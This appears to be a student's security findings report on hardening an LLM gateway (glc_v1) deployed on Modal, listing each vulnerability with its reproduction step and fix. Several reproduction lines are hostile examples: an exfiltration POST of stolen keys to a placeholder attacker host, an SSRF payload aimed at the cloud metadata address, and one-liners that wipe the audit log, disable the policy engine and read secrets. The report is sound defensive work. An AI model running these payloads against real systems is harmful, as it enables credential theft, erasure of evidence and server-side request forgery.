# Session 12 Findings — Migrate, Harden, Hunt

**Base code:** glc_v1 clone  
**Deployment:** Modal (single Function, scale-to-zero, mock keys only)  
**URL:** `<your-modal-url>`

---

## How I approached this

I cloned glc_v1, deployed it to Modal, reproduced each finding against my live deployment, then fixed them. The fixes fall into three categories:

**Wrote from scratch** — understood the vulnerability, designed and wrote the fix myself:
- A1/A2 (auth middleware + docs toggle in `main.py`)
- Leak 9/C2/C3 (envelope spoofing check, audit logging, query-string token removal in `channels.py`)
- C4 (verbose error sanitization across `chat.py`)

**Ported from v2 reference** — read the v2 solution, understood what it does and why, applied it to my v1 clone:
- C1 (SSRF protection — `glc/security/ssrf.py` + import update in `chat.py`)
- Leak 2 (hash-chained audit store — `glc/audit/store.py`)
- Leak 10 (cost-ledger validation — `glc/db.py`)

**Documented only** — these require per-adapter container separation which is capstone scope. No code fix possible within the single-process architecture:
- Leaks 1, 3, 4, 5, 6, 7, 8 and A3, A4
- A5, A6 addressed in `modal_app.py` config
- C5, C6 partially addressed by auth middleware

---

## A. Migration findings

### A1 — Public data plane, no auth
**Reproduce:** `curl -X POST <url>/v1/chat -H "Content-Type: application/json" -d '{"messages":[{"role":"user","content":"hello"}],"provider":"g"}'` — returns provider error, not 401. Anyone can burn my API credits.  
**Invariant:** 2 (every action must be checked against actual user), 8 (hard limits on cost)  
**STRIDE:** Spoofing  
**Fix (wrote from scratch):** HTTP middleware in `main.py`. Two token gates — `GLC_API_TOKEN` for data plane, `GLC_CONTROL_TOKEN` for control plane. Fail-closed if token unset (503). `hmac.compare_digest` for timing-safe comparison.  
**Confirmed:** Same curl now returns 401.

### A2 — Unauthenticated info disclosure
**Reproduce:** `curl <url>/v1/status` returns provider config. `curl <url>/docs` shows full Swagger UI.  
**Invariant:** Information disclosure  
**STRIDE:** I  
**Fix (wrote from scratch):** Info endpoints added to `DATA_PLANE_PATHS` protected set. Swagger/ReDoc/OpenAPI disabled by default — only enabled via `GLC_DOCS_ENABLED` env var.  
**Confirmed:** `curl <url>/v1/status` returns 401. `curl <url>/docs` returns 404.

### A3 — No egress wall
**Reproduce:** `/v1/chat` error shows the Function reached `googleapis.com` — it could reach `attacker.example.com` just as easily.  
**Invariant:** 1 (adapters must not exfiltrate provider API keys)  
**STRIDE:** I  
**Fix (documented):** Requires Modal Sandboxes with `outbound_domain_allowlist` per adapter. Capstone scope.

### A4 — One Secret for the whole Function
**Reproduce:** Any in-process code runs `os.environ["GEMINI_API_KEY"]` and reads it.  
**Invariant:** 1  
**STRIDE:** I  
**Fix (documented):** Each adapter needs its own container with only its platform token. Partially mitigated by control token split (A1) separating data-plane and control-plane credentials.

### A5 — Non-reproducible image
**Reproduce:** `modal_app.py` uses rolling `debian_slim` with `>=` dep ranges — builds aren't deterministic across days.  
**Invariant:** Supply chain integrity  
**STRIDE:** T (tampering via dependency drift)  
**Fix (in modal_app.py):** Build from `uv.lock` with `--frozen` for pinned versions and hashes.

### A6 — Audit DB corruption under autoscale
**Reproduce:** If `min_containers=0` with autoscale, multiple containers write to the same SQLite on a shared Volume — corrupted/split audit trail.  
**Invariant:** 7 (audit log integrity)  
**STRIDE:** T, R  
**Fix (in modal_app.py):** `max_containers=1`. Hash-chained audit (Leak 2) makes any corruption detectable.

---

## B. Ten code leaks

### Leak 1 — Shared process environment
**Reproduce:** `import os; os.environ["GEMINI_API_KEY"]` from any adapter code returns the key.  
**Invariant:** 1 (adapters must not see provider API keys)  
**STRIDE:** I  
**Fix (documented):** Per-adapter containers with scoped Secrets. Capstone scope.

### Leak 2 — Audit database writable at OS level
**Reproduce:** `sqlite3.connect("~/.glc/audit.sqlite").execute("DELETE FROM audit_log")` wipes the audit trail, bypassing the Python-level `append()`-only interface.  
**Invariant:** 7 (components must not edit/delete their own audit logs)  
**STRIDE:** R (repudiation — attacker erases evidence)  
**Fix (ported from v2):** Replaced `glc/audit/store.py` with hash-chained version. Each row stores `prev_hash` and `row_hash = sha256(prev_hash | row_content)`. Deletion or modification of any row breaks the chain. `verify_chain()` walks the log and detects tampering. Threading lock ensures atomic read-prev + insert. OS-level DELETE prevention still requires container separation (mount namespace isolation).  
**Confirmed:** After applying fix, deleting a row and running `verify_chain()` reports `broken_link` error.

### Leak 3 — Pairing escalation via `force_pair_owner()`
**Reproduce:** `get_pairing_store().force_pair_owner("telegram", "attacker-id", user_handle="me")` — one line grants owner trust.  
**Invariant:** 6 (dangerous actions must be approved with final parameters)  
**STRIDE:** Elevation of privilege  
**Fix (documented):** Container separation — adapter can't import gateway modules. Control token split prevents HTTP-level access to pairing endpoints.

### Leak 4 — Install token readable in-process
**Reproduce:** `open(os.path.expanduser("~/.glc/install_token")).read()` — file readable by any in-process code.  
**Invariant:** 4 (credential must work for one specific tool call)  
**STRIDE:** I, S  
**Fix (documented):** Token file only in gateway's mount namespace. Per-adapter scoped tokens. Remote kill already blocked by loopback check. Control token split limits blast radius.

### Leak 5 — Policy engine monkey-patching
**Reproduce:** `glc.policy.engine.evaluate = lambda *_, **__: PolicyVerdict(action="allow", reason="pirate")` — disables all access control in one line.  
**Invariant:** 2 (every action must be checked)  
**STRIDE:** Elevation of privilege  
**Fix (documented):** Policy engine in a separate process that adapter code cannot reach. Capstone scope.

### Leak 6 — Unbounded network egress
**Reproduce:** `httpx.post("https://attacker.example.com/exfil", content=stolen_keys)` — bytes leave without restriction.  
**Invariant:** 1  
**STRIDE:** I  
**Fix (documented):** Modal Sandboxes with egress allowlist per adapter. Same root cause as A3.

### Leak 7 — Unrestricted subprocess/shell
**Reproduce:** `subprocess.run(["cat", "/data/glc/audit.sqlite"], capture_output=True)` — shell and all system tools available.  
**Invariant:** 1, 8  
**STRIDE:** I, D  
**Fix (documented):** Minimal container images, non-root execution, read-only filesystem, gVisor syscall filtering. Python itself is an interpreter, so container isolation is the primary boundary.

### Leak 8 — Adapter kills gateway via `os.kill`
**Reproduce:** `os.kill(os.getpid(), signal.SIGKILL)` — kills the gateway because adapter shares the process.  
**Invariant:** Availability  
**STRIDE:** D (denial of service)  
**Fix (documented):** PID namespace isolation — adapter can't see or signal the gateway's process.

### Leak 9 — Cross-channel envelope spoofing
**Reproduce:** Telegram adapter connected on `WS /v1/channels/telegram` sends `{"channel": "slack", ...}` — gateway processes it as a Slack message without checking.  
**Invariant:** 2 (every action must be checked against actual user)  
**STRIDE:** S (spoofing)  
**Fix (wrote from scratch):** Added `env.channel != name` check in WebSocket handler in `channels.py`. On mismatch: audit the attempt (event_type `channel_mismatch`, channel set to the actual route name for truth, trust_level `untrusted`, result records both expected and declared channel), send error, close connection with `WS_1008_POLICY_VIOLATION`, return. Same check added to webhook POST endpoint (returns 403). Also removed query-string `?token=` fallback — auth is header-only now (C3).  
**Confirmed:** Sending mismatched envelope now returns error and closes the connection. Audit log shows the spoofing attempt.

### Leak 10 — Cost-ledger poisoning
**Reproduce:** `glc.db.log_call(provider="gemini", model="x", input_tokens=999_999_999, agent="victim", status="ok")` — no validation, accepts anything.  
**Invariant:** 8 (hard limits on cost)  
**STRIDE:** T (tampering)  
**Fix (ported from v2):** Added validation to `db.log_call()` in `glc/db.py`. Count fields validated non-negative and bounded at 100M. Provider must be known or an internal sentinel. Agent/session labels sanitized and length-bounded at 128 chars. Latency capped at one week.  
**Confirmed:** `log_call(input_tokens=-1)` now raises `ValueError`. `log_call(input_tokens=999_999_999)` raises `ValueError`.

---

## C. Endpoint/logic issues now internet-reachable

### C1 — SSRF via `/v1/vision`
**Reproduce:** `POST /v1/vision` with `image: "http://169.254.169.254/latest/meta-data/"` — gateway fetches cloud metadata endpoint and returns the content.  
**Invariant:** Information disclosure  
**STRIDE:** I, S (server-side request forgery)  
**Fix (ported from v2):** Created `glc/security/ssrf.py`. Resolves URL hostname to IPs via DNS, blocks private/loopback/link-local/reserved/multicast ranges (IPv4 and IPv6, including unwrapping IPv6-mapped addresses), follows redirects manually with re-validation at each hop (max 4), caps response at 12 MiB. Updated `_resolve_image_urls` in `chat.py` to use `ssrf.fetch_to_data_url`.  
**Confirmed:** `image: "http://169.254.169.254/..."` now returns 400 "url resolves to a disallowed address".

### C2 — Cross-channel envelope spoofing
Same as Leak 9 — see above.

### C3 — WebSocket token in query string
**Reproduce:** `?token=abc` in the WebSocket URL appears in server access logs, proxy logs, referrer headers.  
**Invariant:** 4 (credential security)  
**STRIDE:** I  
**Fix (wrote from scratch):** Removed `token: str | None = Query(default=None)` parameter from WebSocket handler. Auth requires `Authorization: Bearer ...` header only.  
**Confirmed:** WebSocket connection without header auth is rejected.

### C4 — Verbose upstream errors
**Reproduce:** `POST /v1/chat` with an invalid provider — error response contains raw provider error strings with endpoint URLs, error codes, rate limit details.  
**Invariant:** Information disclosure  
**STRIDE:** I  
**Fix (wrote from scratch):** Replaced all client-facing error messages with generic text across `chat.py` — ProviderError handler, generic Exception handler, all-providers-exhausted fallback, streaming errors, embed errors, batch errors, image fetch errors, structured output validation. Detailed errors stay in server-side `db.log_call()`.  
**Confirmed:** Error responses now show generic messages like "provider error", "all providers unavailable".

### C5 — No rate limits on HTTP data plane
**Reproduce:** No per-endpoint rate limiting — send `/v1/chat` thousands of times, no throttling.  
**Invariant:** 8 (hard limits on cost)  
**STRIDE:** D  
**Fix (partial):** Auth middleware (A1) blocks unauthenticated abuse. Per-authenticated-user HTTP rate limits are a follow-up.

### C6 — Pairing-code brute force
**Reproduce:** 6-digit pairing codes with no rate limiting on the confirm endpoint — 1M possibilities, crackable in hours.  
**Invariant:** 6 (dangerous actions must be approved)  
**STRIDE:** S  
**Fix (partial):** Control token split (A1) gates confirm endpoint behind `GLC_CONTROL_TOKEN` which adapters never see. Rate limiting on confirm is a follow-up.

---

## Root cause summary

Leaks 1, 3, 4, 5, 6, 7, 8 all trace to one thing: every adapter runs in the same process as the gateway. They share filesystem, env vars, PID space, network. The code-level fixes I applied (auth middleware, hash chain, cost validation, SSRF, envelope check, error sanitization) are application-layer defenses that work within this constraint. Full isolation needs per-adapter containers with separate Linux namespaces (mount, PID, network, user, IPC) and control groups — that's capstone scope.
